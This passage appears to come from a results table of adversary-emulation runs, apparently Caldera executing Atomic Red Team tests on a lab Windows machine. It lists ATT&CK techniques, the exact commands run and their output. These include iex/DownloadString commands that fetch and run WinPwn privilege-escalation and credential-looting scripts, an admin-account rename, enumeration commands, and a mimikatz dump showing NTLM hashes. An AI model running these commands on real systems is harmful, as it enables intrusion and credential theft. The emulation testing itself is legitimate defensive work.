Impersonation Token.[*] Create a Primary Token from our Impersonation Token.[*] Removed Pipe Service successfully.[*] Server Thread ID: 11 Finished successfully.[*] Done'],[''],['0'],"[""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')""]",['Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn'],['WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique'],"[{'tactic': 'execution', 'technique_name': 'Native API', 'technique_id': 'T1106'}]",['windows'],['psh']
360,Initial-Success,execution,execution :: Native API,execution :: ['WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique'],execution :: T1106,operation__atomic_windows_depfalse_pshtrue__t1106__execution__native_api__b262964145fa55e27265e7caa89b1169__SAVED_2024-03-07_165232,atomic_windows_depfalse_pshtrue__t1106__execution__native_api__b262964145fa55e27265e7caa89b1169,['b262964145fa55e27265e7caa89b1169'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"[""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')""]",['Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn'],['WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique'],"[{'tactic': 'execution', 'technique_name': 'Native API', 'technique_id': 'T1106'}]",['windows'],['psh']
362,Initial-Success,command-and-control,command-and-control :: Ingress Tool Transfer,command-and-control :: ['File Download via PowerShell'],command-and-control :: T1105,operation__atomic_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__b0e28215c59037cc6cdb61b38615c32d__SAVED_2024-03-07_163907,atomic_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__b0e28215c59037cc6cdb61b38615c32d,['b0e28215c59037cc6cdb61b38615c32d'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"[""(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt""]",['Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n'],['File Download via PowerShell'],"[{'tactic': 'command-and-control', 'technique_name': 'Ingress Tool Transfer', 'technique_id': 'T1105'}]",['windows'],['psh']
363,Initial-Success,command-and-control,command-and-control :: Ingress Tool Transfer,command-and-control :: ['Windows - PowerShell Download'],command-and-control :: T1105,operation__atomic_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__a88b5c13a1d5d6bdf02b66bc73411f41__SAVED_2024-03-07_163216,atomic_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__a88b5c13a1d5d6bdf02b66bc73411f41,['a88b5c13a1d5d6bdf02b66bc73411f41'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['(New-Object System.Net.WebClient).DownloadFile(""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", ""$env:TEMP\\Atomic-license.txt"")']",['This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n'],['Windows - PowerShell Download'],"[{'tactic': 'command-and-control', 'technique_name': 'Ingress Tool Transfer', 'technique_id': 'T1105'}]",['windows'],['psh']
371,Initial-Success,persistence,persistence :: Account Manipulation,persistence :: ['Admin Account Manipulate'],persistence :: T1098,operation__atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__9ef143154774a6d0d74e0828e90290ac__SAVED_2024-03-07_155801,atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__9ef143154774a6d0d74e0828e90290ac,['9ef143154774a6d0d74e0828e90290ac'],1,0,1,[1],['HaHa_239487707383Successfully Renamed Administrator Account on  DESKTOP-9LD827I'],[''],['0'],"['$x = Get-Random -Minimum 2 -Maximum 9999; $y = Get-Random -Minimum 2 -Maximum 9999; $z = Get-Random -Minimum 2 -Maximum 9999; $w = Get-Random -Minimum 2 -Maximum 9999; Write-Host HaHa_$x$y$z; $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match ""User"" -and $_.PrincipalSource -match ""Local""} | Select Name; foreach($member in $fmm) {;     if($member -like ""*Administrator*"") {;         $account = $member.Name.Split(""\\"")[-1];         $originalDescription = (Get-LocalUser -Name $account).Description;         Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48);         Rename-LocalUser -Name $account -NewName ""HaHa_$x$y$z"";         Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME;         };     }']",['Manipulate Admin Account Name\n'],['Admin Account Manipulate'],"[{'tactic': 'persistence', 'technique_name': 'Account Manipulation', 'technique_id': 'T1098'}]",['windows'],['psh']
380,Initial-Success,command-and-control,command-and-control :: Proxy: Internal Proxy,command-and-control :: ['portproxy reg key'],command-and-control :: T1090.001,operation__atomic_windows_depfalse_pshtrue__t1090_001__command-and-control__proxy-_internal_proxy__b0eb5108debf92ed5707a964b2bf3481__SAVED_2024-03-07_142144,atomic_windows_depfalse_pshtrue__t1090_001__command-and-control__proxy-_internal_proxy__b0eb5108debf92ed5707a964b2bf3481,['b0eb5108debf92ed5707a964b2bf3481'],1,1,1,[0],[''],[''],['0'],['netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1'],['Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n'],['portproxy reg key'],"[{'tactic': 'command-and-control', 'technique_name': 'Proxy: Internal Proxy', 'technique_id': 'T1090.001'}]",['windows'],['psh']
385,Initial-Success,discovery,discovery :: Account Discovery: Domain Account,discovery :: ['Enumerate Root Domain linked policies Discovery'],discovery :: T1087.002,operation__atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__613dc87cebac339d20973268e0bb1c0b__SAVED_2024-03-07_135345,atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__613dc87cebac339d20973268e0bb1c0b,['613dc87cebac339d20973268e0bb1c0b'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['(([adsisearcher]\'\').SearchRooT).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] Domain Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}']",['The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n'],['Enumerate Root Domain linked policies Discovery'],"[{'tactic': 'discovery', 'technique_name': 'Account Discovery: Domain Account', 'technique_id': 'T1087.002'}]",['windows'],['psh']
391,Initial-Success,discovery,discovery :: Account Discovery: Local Account,discovery :: ['Enumerate all accounts via PowerShell (Local)'],discovery :: T1087.001,operation__atomic_windows_depfalse_pshtrue__t1087_001__discovery__account_discovery-_local_account__e528524d6a3cddaaddc89fcc719e2a3f__SAVED_2024-03-07_130547,atomic_windows_depfalse_pshtrue__t1087_001__discovery__account_discovery-_local_account__e528524d6a3cddaaddc89fcc719e2a3f,['e528524d6a3cddaaddc89fcc719e2a3f'],1,0,1,[1],"['User accounts for \\\\DESKTOP-9LD827I-------------------------------------------------------------------------------Administrator            DefaultAccount           Guest                    puma-4                   sshd                     user                     WDAGUtilityAccount       The command completed successfully.Currently stored credentials:    Target: LegacyGeneric:target=MicrosoftAccount:user=zshu1@outlook.com    Type: Generic     User: zshu1@outlook.com    Local machine persistence        Target: WindowsLive:target=virtualapp/didlogical    Type: Generic     User: 02ztxtqlzceeisya    Local machine persistence    Aliases for \\\\DESKTOP-9LD827I-------------------------------------------------------------------------------*Access Control Assistance Operators*Administrators*Backup Operators*Cryptographic Operators*Device Owners*Distributed COM Users*Event Log Readers*Guests*Hyper-V Administrators*IIS_IUSRS*Network Configuration Operators*Performance Log Users*Performance Monitor Users*Power Users*Remote Desktop Users*Remote Management Users*Replicator*System Managed Accounts Group*UsersThe command completed successfully.Name               Enabled Description                                                                                 ----               ------- -----------                                                                                 Administrator      False   Built-in account for administering the computer/domain                                      DefaultAccount     False   A user account managed by the system.                                                       Guest              False   Built-in account for guest access to the computer/domain                                    puma-4             True                                                                                                sshd               True                                                                                                user               True                                                                                                WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...Name            : DESKTOP-9LD827I\\userSID             : S-1-5-21-2334472832-2587113924-773976260-1003PrincipalSource : LocalObjectClass     : UserName            : NT AUTHORITY\\Authenticated UsersSID             : S-1-5-11PrincipalSource : UnknownObjectClass     : GroupName            : NT AUTHORITY\\INTERACTIVESID             : S-1-5-4PrincipalSource : UnknownObjectClass     : GroupPSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\PublicPSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : PublicPSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : PublicFullName          : C:\\Users\\PublicParent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 12/7/2019 4:14:52 AMCreationTimeUtc   : 12/7/2019 9:14:52 AMLastAccessTime    : 3/7/2024 1:02:42 PMLastAccessTimeUtc : 3/7/2024 6:02:42 PMLastWriteTime     : 3/7/2024 1:02:42 PMLastWriteTimeUtc  : 3/7/2024 6:02:42 PMAttributes        : ReadOnly, DirectoryMode              : d-r---BaseName          : PublicTarget            : {}LinkType          : PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\puma-4PSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : puma-4PSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : puma-4FullName          : C:\\Users\\puma-4Parent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 11/21/2020 5:55:15 PMCreationTimeUtc   : 11/21/2020 10:55:15 PMLastAccessTime    : 3/7/2024 1:01:35 PMLastAccessTimeUtc : 3/7/2024 6:01:35 PMLastWriteTime     : 2/26/2024 6:38:10 PMLastWriteTimeUtc  : 2/26/2024 11:38:10 PMAttributes        : DirectoryMode              : d-----BaseName          : puma-4Target            : {}LinkType          : PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\userPSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : userPSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : userFullName          : C:\\Users\\userParent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 11/21/2020 5:55:14 PMCreationTimeUtc   : 11/21/2020 10:55:14 PMLastAccessTime    : 3/4/2024 4:32:31 PMLastAccessTimeUtc : 3/4/2024 9:32:31 PMLastWriteTime     : 11/2/2023 4:28:16 PMLastWriteTimeUtc  : 11/2/2023 8:28:16 PMAttributes        : DirectoryMode              : d-----BaseName          : userTarget            : {}LinkType          : PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\PublicPSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : PublicPSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : PublicFullName          : C:\\Users\\PublicParent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 12/7/2019 4:14:52 AMCreationTimeUtc   : 12/7/2019 9:14:52 AMLastAccessTime    : 3/7/2024 1:02:42 PMLastAccessTimeUtc : 3/7/2024 6:02:42 PMLastWriteTime     : 3/7/2024 1:02:42 PMLastWriteTimeUtc  : 3/7/2024 6:02:42 PMAttributes        : ReadOnly, DirectoryMode              : d-r---BaseName          : PublicTarget            : {}LinkType          : PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\puma-4PSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : puma-4PSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : puma-4FullName          : C:\\Users\\puma-4Parent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 11/21/2020 5:55:15 PMCreationTimeUtc   : 11/21/2020 10:55:15 PMLastAccessTime    : 3/7/2024 1:01:35 PMLastAccessTimeUtc : 3/7/2024 6:01:35 PMLastWriteTime     : 2/26/2024 6:38:10 PMLastWriteTimeUtc  : 2/26/2024 11:38:10 PMAttributes        : DirectoryMode              : d-----BaseName          : puma-4Target            : {}LinkType          : PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\userPSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : userPSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : userFullName          : C:\\Users\\userParent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 11/21/2020 5:55:14 PMCreationTimeUtc   : 11/21/2020 10:55:14 PMLastAccessTime    : 3/4/2024 4:32:31 PMLastAccessTimeUtc : 3/4/2024 9:32:31 PMLastWriteTime     : 11/2/2023 4:28:16 PMLastWriteTimeUtc  : 11/2/2023 8:28:16 PMAttributes        : DirectoryMode              : d-----BaseName          : userTarget            : {}LinkType          : PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\PublicPSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : PublicPSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : PublicFullName          : C:\\Users\\PublicParent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 12/7/2019 4:14:52 AMCreationTimeUtc   : 12/7/2019 9:14:52 AMLastAccessTime    : 3/7/2024 1:02:42 PMLastAccessTimeUtc : 3/7/2024 6:02:42 PMLastWriteTime     : 3/7/2024 1:02:42 PMLastWriteTimeUtc  : 3/7/2024 6:02:42 PMAttributes        : ReadOnly, DirectoryMode              : d-r---BaseName          : PublicTarget            : {}LinkType          : PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\puma-4PSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : puma-4PSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : puma-4FullName          : C:\\Users\\puma-4Parent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 11/21/2020 5:55:15 PMCreationTimeUtc   : 11/21/2020 10:55:15 PMLastAccessTime    : 3/7/2024 1:01:35 PMLastAccessTimeUtc : 3/7/2024 6:01:35 PMLastWriteTime     : 2/26/2024 6:38:10 PMLastWriteTimeUtc  : 2/26/2024 11:38:10 PMAttributes        : DirectoryMode              : d-----BaseName          : puma-4Target            : {}LinkType          : PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\userPSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\UsersPSChildName       : userPSDrive           : CPSProvider        : Microsoft.PowerShell.Core\\FileSystemPSIsContainer     : TrueName              : userFullName          : C:\\Users\\userParent            : UsersExists            : TrueRoot              : C:\\Extension         : CreationTime      : 11/21/2020 5:55:14 PMCreationTimeUtc   : 11/21/2020 10:55:14 PMLastAccessTime    : 3/4/2024 4:32:31 PMLastAccessTimeUtc : 3/4/2024 9:32:31 PMLastWriteTime     : 11/2/2023 4:28:16 PMLastWriteTimeUtc  : 11/2/2023 8:28:16 PMAttributes        : DirectoryMode              : d-----BaseName          : userTarget            : {}LinkType          : Description     : Members of this group can remotely query authorization attributes and permissions for resources on                   this computer.Name            : Access Control Assistance OperatorsSID             : S-1-5-32-579PrincipalSource : LocalObjectClass     : GroupDescription     : Administrators have complete and unrestricted access to the computer/domainName            : AdministratorsSID             : S-1-5-32-544PrincipalSource : LocalObjectClass     : GroupDescription     : Backup Operators can override security restrictions for the sole purpose of backing up or restoring                   filesName            : Backup OperatorsSID             : S-1-5-32-551PrincipalSource : LocalObjectClass     : GroupDescription     : Members are authorized to perform cryptographic operations.Name            : Cryptographic OperatorsSID             : S-1-5-32-569PrincipalSource : LocalObjectClass     : GroupDescription     : Members of this group can change system-wide settings.Name            : Device OwnersSID             : S-1-5-32-583PrincipalSource : LocalObjectClass     : GroupDescription     : Members are allowed to launch, activate and use Distributed COM objects on this machine.Name            : Distributed COM UsersSID             : S-1-5-32-562PrincipalSource : LocalObjectClass     : GroupDescription     : Members of this group can read event logs from local machineName            : Event Log ReadersSID             : S-1-5-32-573PrincipalSource : LocalObjectClass     : GroupDescription     : Guests have the same access as members of the Users group by default, except for the Guest account                   which is further restrictedName            : GuestsSID             : S-1-5-32-546PrincipalSource : LocalObjectClass     : GroupDescription     : Members of this group have complete and unrestricted access to all features of Hyper-V.Name            : Hyper-V AdministratorsSID             : S-1-5-32-578PrincipalSource : LocalObjectClass     : GroupDescription     : Built-in group used by Internet Information Services.Name            : IIS_IUSRSSID             : S-1-5-32-568PrincipalSource : LocalObjectClass     : GroupDescription     : Members in this group can have some administrative privileges to manage configuration of networking                   featuresName            : Network Configuration OperatorsSID             : S-1-5-32-556PrincipalSource : LocalObjectClass     : GroupDescription     : Members of this group may schedule logging of performance counters, enable trace providers, and                   collect event traces both locally and via remote access to this computerName            : Performance Log UsersSID             : S-1-5-32-559PrincipalSource : LocalObjectClass     : GroupDescription     : Members of this group can access performance counter data locally and remotelyName            : Performance Monitor UsersSID             : S-1-5-32-558PrincipalSource : LocalObjectClass     : GroupDescription     : Power Users are included for backwards compatibility and possess limited administrative powersName            : Power UsersSID             : S-1-5-32-547PrincipalSource : LocalObjectClass     : GroupDescription     : Members in this group are granted the right to logon remotelyName            : Remote Desktop UsersSID             : S-1-5-32-555PrincipalSource : LocalObjectClass     : GroupDescription     : Members of this group can access WMI resources over management protocols (such as WS-Management via                   the Windows Remote Management service). This applies only to WMI namespaces that grant access to the                   user.Name            : Remote Management UsersSID             : S-1-5-32-580PrincipalSource : LocalObjectClass     : GroupDescription     : Supports file replication in a domainName            : ReplicatorSID             : S-1-5-32-552PrincipalSource : LocalObjectClass     : GroupDescription     : Members of this group are managed by the system.Name            : System Managed Accounts GroupSID             : S-1-5-32-581PrincipalSource : LocalObjectClass     : GroupDescription     : Users are prevented from making accidental or intentional system-wide changes and can run most                   applicationsName            : UsersSID             : S-1-5-32-545PrincipalSource : LocalObjectClass     : Group']",[''],['0'],['net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir C:\\Users\\; get-localgroup; net localgroup'],"['Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n']",['Enumerate all accounts via PowerShell (Local)'],"[{'tactic': 'discovery', 'technique_name': 'Account Discovery: Local Account', 'technique_id': 'T1087.001'}]",['windows'],['psh']
399,Initial-Success,discovery,discovery :: System Information Discovery,discovery :: ['WinPwn - Morerecon'],discovery :: T1082,operation__atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__a9faa0d792d6bc2660b05e7650d2736d__SAVED_2024-03-07_121122,atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__a9faa0d792d6bc2660b05e7650d2736d,['a9faa0d792d6bc2660b05e7650d2736d'],1,0,1,[1],"['-------> Dumping general computer information LogonEvent4624        : {@{LogonType=; NewLogonAccountName=puma-4; SourcePort=-; SourceNetworkAddress=-;                         Times=System.Object[]; LogSource=Security; SourceAccountName=DESKTOP-9LD827I$;                         WorkstationName=DESKTOP-9LD827I; Count=29; SourceDomainName=WORKGROUP;                         NewLogonAccountDomain=DESKTOP-9LD827I; LogType=4624}, @{LogonType=;                         NewLogonAccountName=UMFD-1; SourcePort=-; SourceNetworkAddress=-; Times=System.Object[];                         LogSource=Security; SourceAccountName=DESKTOP-9LD827I$; WorkstationName=-; Count=15;                         SourceDomainName=WORKGROUP; NewLogonAccountDomain=Font Driver Host; LogType=4624},                         @{LogonType=; NewLogonAccountName=UMFD-0; SourcePort=-; SourceNetworkAddress=-;                         Times=System.Object[]; LogSource=Security; SourceAccountName=DESKTOP-9LD827I$;                         WorkstationName=-; Count=15; SourceDomainName=WORKGROUP; NewLogonAccountDomain=Font Driver                         Host; LogType=4624}, @{LogonType=; NewLogonAccountName=puma-4; SourcePort=0;                         SourceNetworkAddress=127.0.0.1; Times=System.Object[]; LogSource=Security;                         SourceAccountName=DESKTOP-9LD827I$; WorkstationName=DESKTOP-9LD827I; Count=52;                         SourceDomainName=WORKGROUP; NewLogonAccountDomain=DESKTOP-9LD827I; LogType=4624}}LogonEvent4648        : {@{Times=System.Object[]; TargetAccountName=UMFD-0; LogSource=Security;                         SourceAccountName=DESKTOP-9LD827I$; TargetServer=localhost; Count=15;                         SourceDomainName=WORKGROUP; TargetDomainName=Font Driver Host; LogType=4648},                         @{Times=System.Object[]; TargetAccountName=puma-4; LogSource=Security;                         SourceAccountName=DESKTOP-9LD827I$; TargetServer=localhost; Count=55;                         SourceDomainName=WORKGROUP; TargetDomainName=DESKTOP-9LD827I; LogType=4648},                         @{Times=System.Object[]; TargetAccountName=UMFD-1; LogSource=Security;                         SourceAccountName=DESKTOP-9LD827I$; TargetServer=localhost; Count=15;                         SourceDomainName=WORKGROUP; TargetDomainName=Font Driver Host; LogType=4648}}AppLockerProcessStart : {}PowerShellScriptStart : {}RdpClientData         : {}']",[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput""]",['Gathers local system information using the Morerecon function of WinPwn'],['WinPwn - Morerecon'],"[{'tactic': 'discovery', 'technique_name': 'System Information Discovery', 'technique_id': 'T1082'}]",['windows'],['psh']
403,Initial-Success,discovery,discovery :: System Information Discovery,discovery :: ['Griffon Recon'],discovery :: T1082,operation__atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__488ec76af9bd3c5d9feb1d660504b541__SAVED_2024-03-07_103345,atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__488ec76af9bd3c5d9feb1d660504b541,['488ec76af9bd3c5d9feb1d660504b541'],1,0,1,[1],"['Microsoft (R) Windows Script Host Version 5.812Copyright (C) Microsoft Corporation. All rights reserved.id=525400023D1A&type=put&Hostname=DESKTOP-9LD827I&DomainMember=no&DomainName=WORKGROUP&DomainHosts=-1&UserName=puma-4&LogicalDrives=C:;&SystemInfo=Hostname:DESKTOP-9LD827I%%%Name_OS:Microsoft Windows 10 Education%%%Version_OS:10.0.19045 BuildNumber : 19045%%%Manufacturer_OS:Microsoft Corporation%%%ProductType_OS:%%%BuildType_OS:Multiprocessor Free%%%RegisteredUser:puma-4%%%Organization:%%%SerialNumber:00328-00000-00000-AA711%%%InstallDate:21.11.2020, 18:03:56%%%LastBootUpTime:07.03.2024, 10:22:29%%%%%%%%%%%%MaxNumberOfProcesses:-1%%%SystemType:x64-based PC%%%TotalPhysicalMemory:19998945280%%%Domain:WORKGROUP%%%System_manufacturer:QEMU%%%System_model:Standard PC (Q35 + ICH9, 2009)%%%Processor1: Intel64 Family 6 Model 186 Stepping 2 ~2611 Mhz%%%Processor2: Intel64 Family 6 Model 186 Stepping 2 ~2611 Mhz%%%BIOS_version:Default System BIOS, 1.15.0-1, 01.04.2014%%%WindowsDirectory:C:\\WINDOWS%%%SystemDirectory:C:\\WINDOWS\\system32%%%BootDevice:\\Device\\HarddiskVolume1%%%OSLanguage:1033;English D%%%MUILanguages:en-US%%%CurrentTimeZone:UTC-0-5:00%%%%%%FreePhysicalMemory:15560660%%%TotalVirtualMemorySize:22413804%%%FreeVirtualMemory:18421188%%%Paging file location1: C:\\pagefile.sys%%%QuickFixEngineering_Count-11: %%%QuickFixEngineering1: KB5030841%%%QuickFixEngineering2: KB4562830%%%QuickFixEngineering3: KB4580325%%%QuickFixEngineering4: KB4586864%%%QuickFixEngineering5: KB4598481%%%QuickFixEngineering6: KB5012170%%%QuickFixEngineering7: KB5015684%%%QuickFixEngineering8: KB5031356%%%QuickFixEngineering9: KB5011651%%%QuickFixEngineering10: KB5020372%%%QuickFixEngineering11: KB5031539%%%NetworkAdapter_Count -1: %%%NetworkAdapter1: Intel(R) 82574L Gigabit Network Connection%%%Connection name: Ethernet Instance 0%%%DHCPEnabled:True%%%DHCPServer:192.168.122.1%%%IPAddress:192.168.122.229,fe80::7ce:18e0:9115:ab55%%%&SoftwareInfo=&NetworkInfo=Adapter:Ethernet Instance 0%%%DNSDomainSuffix:%%%MACAddress:52:54:00:02:3D:1A%%%DHCPEnabled:True%%%IPAddress:192.168.122.229,fe80::7ce:18e0:9115:ab55%%%IPSubnet:255.255.255.0,64%%%DefaultIPGateway:192.168.122.1%%%DHCPServer:192.168.122.1%%%DNSServers:192.168.122.1%%%&ProcessList=&DesktopFileList=agent_for_custom_caldera_adv.py%%%d06deb_griffon_recon.vbs%%%desktop.ini%%%Unpackers.zip%%%Visual Studio Code.lnk%%%&DesktopScreenshot=NoScreenshot&WebHistory=nothing&SecurityInfo=Current_user: admin&&&AntiVirus:Windows Defender%%%%%%Admin_privileges: Enabled&UACInfoUAC: On&&&Will you be prompted to allow elevation for administrator: No&&&Prompt for elevation permission prompt: Interactive&&&&']",[''],['0'],"['cscript ""d06deb_griffon_recon.vbs""']",['This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)'],['Griffon Recon'],"[{'tactic': 'discovery', 'technique_name': 'System Information Discovery', 'technique_id': 'T1082'}]",['windows'],['psh']
406,Initial-Success,multiple,multiple :: Valid Accounts: Local Accounts,multiple :: ['WinPwn - Loot local Credentials - powerhell kittie'],multiple :: T1078.003,operation__atomic_windows_depfalse_pshtrue__t1078_003__multiple__valid_accounts-_local_accounts__5ce7136a4547b0bf3ca074c94fb10b24__SAVED_2024-03-07_094817,atomic_windows_depfalse_pshtrue__t1078_003__multiple__valid_accounts-_local_accounts__5ce7136a4547b0bf3ca074c94fb10b24,['5ce7136a4547b0bf3ca074c94fb10b24'],1,0,1,[1],"['Dumping Credentials output goes to .\\Exploitation\\Credentials.txtHostname: DESKTOP-9LD827I / S-1-5-21-2334472832-2587113924-773976260  .#####.   mimikatz 2.2.0 (x64) #19041 May 20 2020 14:57:36 .## ^ ##.  ""A La Vie, A L\'Amour"" - (oe.eo) ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  \'#####\'        > http://pingcastle.com / http://mysmartlogon.com   ***/mimikatz(powershell) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 127290 (00000000:0001f13a)Session           : Interactive from 1User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : .\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 127247 (00000000:0001f10f)Session           : Interactive from 1User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : .\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp 